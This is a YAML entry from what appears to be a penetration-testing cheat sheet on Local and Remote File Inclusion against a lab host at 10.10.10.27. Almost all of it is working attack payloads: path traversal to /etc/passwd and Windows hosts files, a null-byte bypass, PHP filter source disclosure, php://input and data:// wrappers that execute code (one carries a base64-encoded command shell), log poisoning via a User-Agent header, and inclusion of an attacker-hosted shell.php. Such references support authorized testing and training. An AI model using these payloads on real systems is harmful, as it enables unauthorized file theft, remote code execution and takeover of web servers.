---
description: |
  Local File Inclusion (LFI) and Remote File Inclusion (RFI) attacks to read sensitive files, achieve code execution, or include remote payloads.
command: |
  # Basic LFI — read /etc/passwd
  http://10.10.10.27/page?file=../../../../etc/passwd

  # Null byte bypass (PHP < 5.3.4)
  http://10.10.10.27/page?file=../../../../etc/passwd%00

  # PHP filter — read source code as base64
  http://10.10.10.27/page?file=php://filter/convert.base64-encode/resource=index.php

  # PHP input wrapper — execute code via POST body
  curl -X POST "http://10.10.10.27/page?file=php://input" --data "<?php system('id'); ?>"

  # Data wrapper — inline code execution
  http://10.10.10.27/page?file=data://text/plain,<?php phpinfo();?>

  # Data wrapper — base64 encoded payload
  http://10.10.10.27/page?file=data://text/plain;base64,PD9waHAgc3lzdGVtKCRfR0VUWydjbWQnXSk7Pz4=

  # Log poisoning — inject PHP into User-Agent, then include log
  curl -A "<?php system(\$_GET['cmd']); ?>" http://10.10.10.27/
  http://10.10.10.27/page?file=../../../../var/log/apache2/access.log&cmd=id

  # Remote File Inclusion — include attacker-hosted shell
  http://10.10.10.27/page?file=http://10.10.10.21/shell.php

  # Windows path traversal
  http://10.10.10.27/page?file=..\..\..\..\windows\system32\drivers\etc\hosts
items:
  - No_Creds
phase:
  - Exploitation
target_os:
  - Linux
  - Windows
services:
  - HTTP
techniques:
  - LFI_RFI
references:
  - https://owasp.org/www-project-web-security-testing-guide/latest/4-Web_Application_Security_Testing/07-Input_Validation_Testing/11.1-Testing_for_Local_File_Inclusion
---
